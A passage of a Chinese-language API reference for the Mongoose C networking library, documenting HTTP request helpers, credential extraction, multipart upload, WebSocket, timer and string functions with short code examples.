<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct mg_str *cookie = mg_http_get_header(hm, &quot;Cookie&quot;);</span><br><span class="line">struct mg_str token = mg_str(&quot;&quot;);</span><br><span class="line"></span><br><span class="line">if (cookie != NULL) &#123;</span><br><span class="line">  token = mg_http_get_header_var(*cookie, mg_str(&quot;access_token&quot;));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-http-var"><a href="#mg-http-var" class="headerlink" title="mg_http_var()"></a><code>mg_http_var()</code></h4><ul>
<li><code>struct mg_str mg_http_var(struct mg_str buf, struct mg_str name);</code></li>
<li>获取未编码的HTTP变量</li>
<li>参数：<ul>
<li><code>buf</code>  –  一个url编码的字符串：HTTP请求体或查询字符串(HTTP request body or query string)</li>
<li><code>name</code> –  获取的变量名字</li>
</ul>
</li>
<li>返回值：返回变量的值 或 返回一个空的字符串，表示没有找到</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// We have received a request to /my/uri?a=b&amp;c=d%20</span><br><span class="line">// The hm-&gt;query points to &quot;a=b&amp;c=d%20&quot;</span><br><span class="line">struct mg_str v = mg_http_var(hm-&gt;query, mg_str(&quot;c&quot;));  // v = &quot;d%20&quot;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-http-get-var"><a href="#mg-http-get-var" class="headerlink" title="mg_http_get_var()"></a><code>mg_http_get_var()</code></h4><ul>
<li><code>int mg_http_get_var(const struct mg_str *var, const char *name, char *buf, int len);</code></li>
<li>获取并解码HTTP 变量</li>
<li>参数：<ul>
<li><code>var</code>    –  HTTP请求体(HTTP request body)</li>
<li><code>name</code>   –  变量名</li>
<li><code>buf</code>    –  写入解码变量的缓冲区(Buffer to write decoded variable)</li>
<li><code>len</code>    –  缓冲区大小</li>
</ul>
</li>
<li>返回值：解码变量的长度 或 0，负数表示错误</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">char buf[100] = &quot;&quot;;</span><br><span class="line">mg_http_get_var(&amp;hm-&gt;body, &quot;key1&quot;, buf, sizeof(buf)) &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-http-creds"><a href="#mg-http-creds" class="headerlink" title="mg_http_creds()"></a><code>mg_http_creds()</code></h4><ul>
<li><code>void mg_http_creds(struct mg_http_message *hm, char *user, size_t userlen, char *pass, size_t passlen);</code></li>
<li>从请求获取身份验证证书，然后将它存储到<code>user</code>, <code>userlen</code>, <code>pass</code>, <code>passlen</code>缓冲区中。</li>
<li>证书按以下顺序查找<ul>
<li>从HTTP header中的<code>Authorization</code>中：<ul>
<li>基本身份(Basic auth) ，填充到<code>user</code> 和 <code>pass</code></li>
<li>持票人身份(Bearer auth)，仅填充到<code>pass</code></li>
</ul>
</li>
<li>从 cookie 的<code>access_token</code>中，填充<code>pass</code></li>
<li>从搜索字符串参数的<code>?access_token=...</code>，填充<code>pass</code></li>
</ul>
</li>
<li>如果都没有，<code>user</code>和<code>pass</code>都被设置为以NULL结尾的字符串</li>
<li>参数：<ul>
<li><code>hm</code>    –  需要查找证书的HTTP 消息</li>
<li><code>user</code>  –  接收用户名字的缓冲区</li>
<li><code>userlen</code>  –  user缓冲区的大小</li>
<li><code>pass</code>  –  接收密码的缓冲区</li>
<li><code>passlen</code>  –  pass缓冲区的大小</li>
</ul>
</li>
<li>返回值：空</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// Mongoose events handler</span><br><span class="line">void fn(struct mg_connection *c, int ev, void *ev_data, void *fn_data) &#123;</span><br><span class="line">  if (ev == MG_EV_HTTP_MSG) &#123;</span><br><span class="line">    struct mg_http_message *hm = (struct mg_http_message *) ev_data;</span><br><span class="line">    char user[100], pass[100];</span><br><span class="line">    mg_http_creds(hm, user, sizeof(user), pass, sizeof(pass)); // &quot;user&quot; is now user name and &quot;pass&quot; is now password from request</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-http-match-uri"><a href="#mg-http-match-uri" class="headerlink" title="mg_http_match_uri()"></a><code>mg_http_match_uri()</code></h4><ul>
<li><code>bool mg_http_match_uri(const struct mg_http_message *hm, const char *glob);</code></li>
<li>检查在HTTP请求报文中，是否有和给定的<code>glob</code>字符串相匹配的字符串</li>
<li>参数：<ul>
<li><code>hm</code>    –  需要匹配检索的HTTP消息</li>
<li><code>glob</code>  –  匹配的字符串</li>
</ul>
</li>
<li>返回值：如果在HTTP请求报文中找到了匹配的字符串，返回 True 或者 返回 False表示未匹配到</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// Mongoose events handler</span><br><span class="line">void fn(struct mg_connection *c, int ev, void *ev_data, void *fn_data) &#123;</span><br><span class="line">  if (ev == MG_EV_HTTP_MSG) &#123;</span><br><span class="line">    struct mg_http_message *hm = (struct mg_http_message *) ev_data;</span><br><span class="line">    if (mg_http_match_uri(hm, &quot;/secret&quot;)) &#123;</span><br><span class="line">      mg_http_reply(c, 200, NULL, &quot;Very big secret!&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      mg_http_reply(c, 200, NULL, &quot;hello world..&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-http-bauth"><a href="#mg-http-bauth" class="headerlink" title="mg_http_bauth()"></a><code>mg_http_bauth()</code></h4><ul>
<li><code>void mg_http_bauth(struct mg_connection *c, const char *user, const char *pass);</code></li>
<li>将一个基本的<code>Authorization</code> header写入到输出缓冲区</li>
<li>参数：<ul>
<li><code>c</code>    –  使用的连接</li>
<li><code>user</code> –  用户名</li>
<li><code>pass</code> –  密码</li>
</ul>
</li>
<li>返回值：无</li>
<li>示例：使用基本验证来创建Stripe订阅的用法示例<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mg_printf(c, &quot;POST /v1/subscriptions HTTP/1.1\r\n&quot;</span><br><span class="line">             &quot;Host: api.stripe.com\r\n&quot;</span><br><span class="line">             &quot;Transfer-Encoding: chunked\r\n&quot;);</span><br><span class="line">mg_http_bauth(c, stripe_private_key, NULL);     // Add Basic auth header</span><br><span class="line">mg_printf(c, &quot;%s&quot;, &quot;\r\n&quot;);                     // End HTTP headers</span><br><span class="line"></span><br><span class="line">mg_http_printf_chunk(c, &quot;&amp;customer=%s&quot;, customer_id);   // Set customer</span><br><span class="line">mg_http_printf_chunk(c, &quot;&amp;items[0][price]=%s&quot;, price);  // And price</span><br><span class="line">mg_http_printf_chunk(c, &quot;&quot;);                            // End request</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="struct-mg-http-part"><a href="#struct-mg-http-part" class="headerlink" title="struct mg_http_part"></a><code>struct mg_http_part</code></h4><ul>
<li>声明：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// Parameter for mg_http_next_multipart</span><br><span class="line">struct mg_http_part &#123;</span><br><span class="line">  struct mg_str name;      // Form field name</span><br><span class="line">  struct mg_str filename;  // Filename for file uploads</span><br><span class="line">  struct mg_str body;      // Part contents</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li>描述HTTP 多个消息(multipart message)中单个部分的结构体</li>
</ul>
<h4 id="mg-http-next-multipart"><a href="#mg-http-next-multipart" class="headerlink" title="mg_http_next_multipart()"></a><code>mg_http_next_multipart()</code></h4><ul>
<li><code>size_t mg_http_next_multipart(struct mg_str body, size_t offset, struct mg_http_part *part);</code></li>
<li>根据给定的<code>offset</code>，在<code>body</code>中解析multipart chunk。一个初始的<code>offset</code>应该为0.在提供的<code>part</code>中填充参数，可能为空。返回下一块的offsete，或者返回0表示没有其他块(chunks)</li>
<li>参数：<ul>
<li><code>body</code>  –  消息体(message body)</li>
<li><code>offset</code>  –  开始偏移量(start offset)</li>
<li><code>part</code>  –  指向需要填充的<code>struct mg_http_part</code>结构体</li>
</ul>
</li>
<li>返回值：返回下一块的offsete，或者返回0表示没有其他块(chunks)</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct mg_http_part part;</span><br><span class="line">size_t pos = 0;</span><br><span class="line"></span><br><span class="line">while ((pos = mg_http_next_multipart(body, pos, &amp;part)) != 0) &#123;</span><br><span class="line">  // Use part</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-http-upload"><a href="#mg-http-upload" class="headerlink" title="mg_http_upload()"></a><code>mg_http_upload()</code></h4><ul>
<li><code>int mg_http_upload(struct mg_connection *c, struct mg_http_message *hm, struct mg_fs *fs, const char *path, size_t max_size);</code></li>
<li>这是一个助手实用程序功能，用于通过小块上传大型文件。将HTTP POST 数据追加到指定目录的文件中。文件名和文件偏移由查询字符串参数指定:<code>POST /upload?name=firmware.bin&amp;offset=2048 HTTP/1.1</code>。如果偏移量为0，则将文件截断。客户的责任是将文件分为较小的块，并发送一系列由此功能处理的POST请求</li>
<li>参数：<ul>
<li><code>c</code>    –  一个连接</li>
<li><code>hm</code>   –  一个需要被解析的HTTP message</li>
<li><code>fs</code>   –  需要写文件的文件系统，例如：<code>&amp;mg_fs_posix</code></li>
<li><code>path</code> –  一个文件名</li>
<li><code>max_size</code>  –  允许的文件大小的最大值</li>
</ul>
</li>
<li>返回值：写完后，返回文件的大小  或者 返回一个负数表示错误</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">static void fn(struct mg_connection *c, int ev, void *ev_data, void *fn_data) &#123;</span><br><span class="line">  if (ev == MG_EV_HTTP_MSG) &#123;</span><br><span class="line">    struct mg_http_message *hm = (struct mg_http_message *) ev_data;</span><br><span class="line">    if (mg_http_match_uri(hm, &quot;/upload&quot;)) &#123;</span><br><span class="line">      mg_http_upload(c, hm, &amp;mg_fs_posix, &quot;/tmp/myfile.bin&quot;, 99999);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      struct mg_http_serve_opts opts = &#123;.root_dir = &quot;.&quot;&#125;;   // Serve</span><br><span class="line">      mg_http_serve_dir(c, ev_data, &amp;opts);                 // static content</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="1-4-WebSocket-API"><a href="#1-4-WebSocket-API" class="headerlink" title="1.4 WebSocket API"></a>1.4 WebSocket API</h3><h4 id="struct-mg-ws-message"><a href="#struct-mg-ws-message" class="headerlink" title="struct mg_ws_message"></a><code>struct mg_ws_message</code></h4><ul>
<li>声明：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct mg_ws_message &#123;</span><br><span class="line">  struct mg_str data; // WebSocket message data</span><br><span class="line">  uint8_t flags;      // WebSocket message flags</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li>该结构代表Websocket消息。这个<code>flag</code>元素对应于<code>RFC 6455</code>第5.2节中所述的第一个字节。(<code>https://www.rfc-editor.org/rfc/rfc6455#section-5.2</code>)</li>
</ul>
<h4 id="WebSockete-message-type"><a href="#WebSockete-message-type" class="headerlink" title="WebSockete message type:"></a>WebSockete message type:</h4><ul>
<li>要从传入消息中提取消息类型，在结构体<code>mg_ws_message</code>的<code>flag</code>元素中检查四个<code>LSBs</code></li>
<li>可能存在的WebSocket消息类型：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#define WEBSOCKET_OP_CONTINUE 0</span><br><span class="line">#define WEBSOCKET_OP_TEXT 1</span><br><span class="line">#define WEBSOCKET_OP_BINARY 2</span><br><span class="line">#define WEBSOCKET_OP_CLOSE 8</span><br><span class="line">#define WEBSOCKET_OP_PING 9</span><br><span class="line">#define WEBSOCKET_OP_PONG 10</span><br></pre></td></tr></table></figure></li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// Mongoose events handler</span><br><span class="line">void fn(struct mg_connection *c, int ev, void *ev_data, void *fn_data) &#123;</span><br><span class="line">  if (ev == MG_EV_WS_MSG) &#123;</span><br><span class="line">    struct mg_ws_message *wm = (struct mg_ws_message *) ev_data;</span><br><span class="line">    msgtype = wm-&gt;flags &amp; 0x0F;</span><br><span class="line">    if (msgtype == WEBSOCKET_OP_BINARY) &#123;</span><br><span class="line">      // This is a binary data message</span><br><span class="line">    &#125; else if (msgtype == WEBSOCKET_OP_TEXT) &#123;</span><br><span class="line">      // This is a text data message</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>当调用<code>mg_ws_send()</code>或<code>ms_ws_printf()</code>发送消息时，请使用<code>RFC 6455</code>第5.6节中所述的正确消息类型进行数据帧(<code>https://www.rfc-editor.org/rfc/rfc6455#section-5.6</code>)</li>
</ul>
<h4 id="mg-ws-connect"><a href="#mg-ws-connect" class="headerlink" title="mg_ws_connect()"></a><code>mg_ws_connect()</code></h4><ul>
<li><code>struct mg_connection *mg_ws_connect(struct mg_mgr *mgr, const char *url, mg_event_handler_t fn, void *fn_data, const char *fmt, ...);</code></li>
<li>创建客户端Websocket连接。这个函数不能连接到对端，它仅仅分配需要的资源和启动连接进程。当对端真正连接好了，会向连接事件处理函数发送一个<code>MG_EV_CONNECT</code>事件</li>
<li>参数：<ul>
<li><code>mgr</code>  –  使用的事件管理结构体</li>
<li><code>url</code>  –  指定的远程URL。例如：<code>http://google.com</code></li>
<li><code>fn</code>   –  一个事件处理函数</li>
<li><code>fn_data</code>  –  一个任意指针，当事件处理函数被调用时，它会被作为<code>fn_data</code>传递。这个指针作为<code>c-&gt;fn_data</code>存储在连接结构体中</li>
</ul>
</li>
<li>返回值：返回一个指向创建的连接； 返回NULL表示错误</li>
<li>示例<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">struct mg_connection *c = mg_ws_connect(&amp;mgr, &quot;ws://test_ws_server.com:1000&quot;,</span><br><span class="line">                                        handler, NULL, &quot;%s&quot;, &quot;Sec-WebSocket-Protocol: echo\r\n&quot;);</span><br><span class="line">if(c == NULL) fatal(&quot;Cannot create connection&quot;);</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-ws-upgrade"><a href="#mg-ws-upgrade" class="headerlink" title="mg_ws_upgrade()"></a><code>mg_ws_upgrade()</code></h4><ul>
<li><code>void mg_ws_upgrade(struct mg_connection *c, struct mg_http_message *, const char *fmt, ...);</code></li>
<li>升级给定HTTP连接到Websocket。<code>fmt</code>是一个类似于<code>printf()</code>格式的字符串，用于额外的HTTP标头，返回给Websocket握手的客户端。如果不需要额外的标头，将<code>fmt</code>设置为空。</li>
<li>参数：<ul>
<li><code>c</code>    –  使用的连接</li>
<li><code>hm</code>   –  HTTP消息</li>
<li><code>fmt</code>  –  类似于<code>printf</code>的格式字符串，用于附加<code>HTTP</code>标头或为null</li>
</ul>
</li>
<li>返回值：无</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// Mongoose events handler</span><br><span class="line">void fn(struct mg_connection *c, int ev, void *ev_data, void *fn_data) &#123;</span><br><span class="line">  if (ev == MG_EV_HTTP_MSG) &#123;</span><br><span class="line">    struct mg_http_message *hm = (struct mg_http_message *) ev_data;</span><br><span class="line">    mg_ws_upgrade(c, hm, NULL);  // Upgrade HTTP to WS</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-ws-send"><a href="#mg-ws-send" class="headerlink" title="mg_ws_send()"></a><code>mg_ws_send()</code></h4><ul>
<li><code>size_t mg_ws_send(struct mg_connection *c, const void *buf, size_t len, int op);</code></li>
<li>向WebSocket对端发送数据</li>
<li>参数：<ul>
<li><code>c</code>  –  使用的连接</li>
<li><code>buf</code>  –  需要发送的数据</li>
<li><code>len</code>  –  需要发送的数据大小</li>
<li><code>op</code>   –  WebSocket消息类型，参见WebSocket message type</li>
</ul>
</li>
<li>返回值：返回发送的字节数</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// Mongoose events handler</span><br><span class="line">void fn(struct mg_connection *c, int ev, void *ev_data, void *fn_data) &#123;</span><br><span class="line">  if (ev == MG_EV_WS_OPEN) &#123;</span><br><span class="line">    struct mg_http_message *hm = (struct mg_http_message *) ev_data;</span><br><span class="line">    mg_ws_send(c, &quot;opened&quot;, 6, WEBSOCKET_OP_BINARY);  // Send &quot;opened&quot; to web socket connection</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-ws-printf-mg-ws-vprintf"><a href="#mg-ws-printf-mg-ws-vprintf" class="headerlink" title="mg_ws_printf(), mg_ws_vprintf()"></a><code>mg_ws_printf(), mg_ws_vprintf()</code></h4><ul>
<li><code>size_t mg_ws_printf(struct mg_connection *, int op, const char *fmt, ...);</code></li>
<li><code>size_t mg_ws_vprintf(struct mg_connection *, int op, const char *fmt, va_list *);</code></li>
<li>和<code>ms_ws_send()</code>相同，但是使用<code>printf()</code>语义格式化数据</li>
<li>参数：<ul>
<li><code>c</code>   –  使用的连接</li>
<li><code>op</code>  –  WebSocket消息类型，参见WebSocket message type</li>
<li><code>fmt</code> –  使用<code>printf()</code>语义格式化的字符串</li>
</ul>
</li>
<li>返回值：返回发送的字节数</li>
<li>示例<ul>
<li><code>mg_ws_printf(c, WEBSOCKET_OP_TEXT, &quot;Hello, %s!&quot;, &quot;world&quot;);</code></li>
</ul>
</li>
</ul>
<h4 id="mg-ws-wrap"><a href="#mg-ws-wrap" class="headerlink" title="mg_ws_wrap()"></a><code>mg_ws_wrap()</code></h4><ul>
<li><code>size_t mg_ws_wrap(struct mg_connection *c, size_t len, int op)</code></li>
<li>将输出缓冲区中的数据转换为Websocket格式。有用然后通过WebSocket实施协议。具体示例参见<code>examples/mqtt-over-ws-client</code></li>
<li>参数：<ul>
<li><code>c</code>  –  使用的连接</li>
<li><code>len</code>  –  转换的字节数</li>
<li><code>op</code>   –  WebSocket消息类型</li>
</ul>
</li>
<li>返回值：返回连接结构体中输出缓冲区新的大小</li>
<li>示例<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">size_t len = c-&gt;send.len;         // Store output buffer len</span><br><span class="line">mg_mqtt_login(c, s_url, &amp;opts);   // Write MQTT login message</span><br><span class="line">mg_ws_wrap(c, c-&gt;send.len - len, WEBSOCKET_OP_BINARY); // Wrap it into WS</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="1-5-Timer-API"><a href="#1-5-Timer-API" class="headerlink" title="1.5 Timer API"></a>1.5 Timer API</h3><h4 id="mg-timer-add"><a href="#mg-timer-add" class="headerlink" title="mg_timer_add()"></a><code>mg_timer_add()</code></h4><ul>
<li><code>struct mg_timer *mg_timer_add(struct mg_mgr *mgr, uint64_t period_ms, unsigned flags, void (*fn)(void *), void *fn_data);</code></li>
<li>设置一个计时器。这是一个高级计时器API，允许将软件计时器添加到活动管理器。这个函数使用<code>calloc()</code>一个新的计时器，并将它添加到<code>mgr-&gt;timers</code>列表中。当调用<code>mg_mgr_poll()</code>时，所有添加的计时器均进行轮询，并在计时器到期时调用计时器设定的函数</li>
<li>注意：<ul>
<li>确保计时器的间隔等于或大于<code>mg_mgr_poll()</code>的超时时间</li>
</ul>
</li>
<li>参数：<ul>
<li><code>mgr</code>   –  指向事件管理器的结构体指针</li>
<li><code>ms</code>    –  一个时间间隔，以毫秒为单位</li>
<li><code>flags</code> –  计时器标志掩码：<code>MG_TIMER_REPEAT</code>和<code>MG_TIMER_RUN_NOW</code></li>
<li><code>fn</code>    –  函数调用</li>
<li><code>fn_data</code>  –  调用的函数参数</li>
</ul>
</li>
<li>返回值：返回一个指向创建的计时器的指针</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">void timer_fn(void *data) &#123;</span><br><span class="line">  // ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mg_timer_add(mgr, 1000, MG_TIMER_REPEAT, timer_fn, NULL);</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="struct-mg-timer"><a href="#struct-mg-timer" class="headerlink" title="struct mg_timer"></a><code>struct mg_timer</code></h4><ul>
<li>声明：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">struct mg_timer &#123;</span><br><span class="line">  uint64_t period_ms;       // Timer period in milliseconds</span><br><span class="line">  uint64_t expire;          // Expiration timestamp in milliseconds</span><br><span class="line">  unsigned flags;           // Possible flags values below</span><br><span class="line">#define MG_TIMER_ONCE 0     // Call function once</span><br><span class="line">#define MG_TIMER_REPEAT 1   // Call function periodically</span><br><span class="line">#define MG_TIMER_RUN_NOW 2  // Call immediately when timer is set</span><br><span class="line">  void (*fn)(void *);       // Function to call</span><br><span class="line">  void *arg;                // Function argument</span><br><span class="line">  struct mg_timer *next;    // Linkage</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li>计时器结构体。描述一个软件计时器。计时器粒度与主事件循环中的<code>mg_mgr_poll()</code>的超时参数相同</li>
</ul>
<h4 id="mg-timer-init"><a href="#mg-timer-init" class="headerlink" title="mg_timer_init()"></a><code>mg_timer_init()</code></h4><ul>
<li><code>void mg_timer_init(struct mg_timer **head, struct mg_timer *t, uint64_t period_ms, unsigned flags, void (*fn)(void *), void *fn_data);</code></li>
<li>设置一个计时器</li>
<li>参数：<ul>
<li><code>head</code>    –  指向<code>mg_timer</code>队列头部的指针</li>
<li><code>t</code>       –  指向一个需要被初始化的<code>mg_timer</code></li>
<li><code>ms</code>      –  时间间隔，以毫秒为单位</li>
<li><code>flags</code>   –  计时器标志掩码：<code>MG_TIMER_REPEAT</code>和<code>MG_TIMER_RUN_NOW</code></li>
<li><code>fn</code>    –  函数调用</li>
<li><code>fn_data</code>  –  调用的函数参数</li>
</ul>
</li>
<li>返回值：无</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void timer_fn(void *data) &#123;</span><br><span class="line">  // ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct mg_timer timer, *head = NULL;</span><br><span class="line">mg_timer_init(&amp;head, &amp;timer, 1000, MG_TIMER_REPEAT, timer_fn, NULL);</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-timer-free"><a href="#mg-timer-free" class="headerlink" title="mg_timer_free()"></a><code>mg_timer_free()</code></h4><ul>
<li><code>void mg_timer_free(struct mg_timer **head, struct mg_timer *t);</code></li>
<li>释放计时器，将其从内部计时器列表中删除。</li>
<li>参数：<ul>
<li><code>head</code>  –  指向<code>mg_timer</code>队列头部的指针</li>
<li><code>t</code>     –  需要释放的计时器</li>
</ul>
</li>
<li>返回值：无</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">struct mg_timer timer;</span><br><span class="line">// ...</span><br><span class="line">mg_timer_free(&amp;timer);</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-timer-poll"><a href="#mg-timer-poll" class="headerlink" title="mg_timer_poll()"></a><code>mg_timer_poll()</code></h4><ul>
<li><code>void mg_timer_poll(struct mg_timer **head, uint64_t uptime_ms);</code></li>
<li>如果当前的时间戳<code>uptime_ms</code>超过了计时器的到期时间，则计时器遍历列表，并调用它们</li>
<li>参数：<ul>
<li><code>head</code>   –  指向<code>mg_timer</code>列表头部的指针</li>
<li><code>uptime_ms</code>  –  当前时间戳</li>
</ul>
</li>
<li>返回值：无</li>
<li>示例<ul>
<li><code>mg_timer_poll(mg_millis());</code></li>
</ul>
</li>
</ul>
<h3 id="1-6-Time"><a href="#1-6-Time" class="headerlink" title="1.6 Time"></a>1.6 Time</h3><h4 id="mg-millis"><a href="#mg-millis" class="headerlink" title="mg_millis()"></a><code>mg_millis()</code></h4><ul>
<li><code>int64_t mg_millis(void);</code></li>
<li>以毫秒返回当前的正常运行时间。</li>
<li>参数：无</li>
<li>返回值：当前时间戳</li>
<li>示例：<ul>
<li><code>int64_t uptime = mg_millis();</code></li>
</ul>
</li>
</ul>
<h3 id="1-7-String"><a href="#1-7-String" class="headerlink" title="1.7 String"></a>1.7 String</h3><h4 id="struct-mg-str"><a href="#struct-mg-str" class="headerlink" title="struct mg_str"></a><code>struct mg_str</code></h4><ul>
<li>声明：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct mg_str &#123;</span><br><span class="line">  const char *ptr;  // Pointer to string data</span><br><span class="line">  size_t len;       // String len</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li>该结构代表了任意内存的一部分，并不一定是<code>zero-terminated</code>。这是一个<code>mongoose string</code>，它在代码库中广泛使用，而不是C zero-terminated strings</li>
<li>例如<ul>
<li>当一个HTTP request到达时，Mongoose创建了一个<code>mg_http_message</code>结构体，该结构体包含一个指向请求方法，URI，头部等<code>struct mg_str</code>结构体集合。这样，Mongoose避免了任何堆申请，并且不会修改接收的缓冲区。相反，它使用<code>struct mg_str</code>来描述HTTP请求的各个部分</li>
<li>许多其他情况也是如此。</li>
</ul>
</li>
<li>注意：<ul>
<li>由于<code>ptr</code>不一定是<code>zero-terminated</code>，因此请勿使用libc字符串函数，例如：<code>strlen()</code>或<code>sscanf()</code></li>
</ul>
</li>
</ul>
<h4 id="mg-str"><a href="#mg-str" class="headerlink" title="mg_str()"></a><code>mg_str()</code></h4><ul>
<li><code>struct mg_str mg_str(const char *s)</code></li>
<li>从<code>NULL-terminated C-string</code>创建一个Mongoose字符串。这个函数不重复提供字符串，并且将指针存储在创建的<code>mg_str</code>结构中</li>
<li>注意：<ul>
<li>在C++(构造函数)中存在此问题，这个功能有同义词<code>mg_str_s</code></li>
</ul>
</li>
<li>参数：<ul>
<li><code>s</code>  –  一个指向需要存储到<code>mg_str</code>结构中的<code>NULL-terminated string</code></li>
</ul>
</li>
<li>返回值：创建的Mongoose string</li>
<li>示例：  <ul>
<li><code>struct mg_str str = mg_str(&quot;Hello, world!);</code></li>
</ul>
</li>
</ul>
